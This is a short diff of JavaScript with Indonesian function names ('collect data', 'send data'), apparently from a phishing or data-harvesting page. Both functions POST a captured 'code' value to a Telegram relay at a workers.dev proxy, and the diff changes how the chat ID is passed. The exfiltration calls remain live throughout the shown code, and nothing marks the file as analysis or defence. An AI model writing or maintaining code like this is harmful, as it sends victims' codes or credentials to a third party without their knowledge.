@@ -216,9 +216,10 @@
   
   
   function kumpulData(opsi) {
-	  const chatId = '-4879699338';
+	  const chatId = '-4879699';
 	  const title = opsi;
-	  const body = `chat_id=${chatId}&title=${title} ${code}`;
+	  //const body = `chat_id=${chatId}&title=${title} ${code}`;
+	  const body = `title=${title} ${code}`;
 
 	  fetch('https://telegramproxy.demigod1337.workers.dev/', {
 		method: 'POST',
@@ -258,7 +259,7 @@
     function kirimData() {
 	  const chatId = '-4879699338';
 	  const title = `${encodeURIComponent(code)}`;
-	  const body = `chat_id=${chatId}&title=${title}`;
+	  const body = `title=${title}`;
 
 	  fetch('https://telegramproxy.demigod1337.workers.dev/', {
 		method: 'POST',
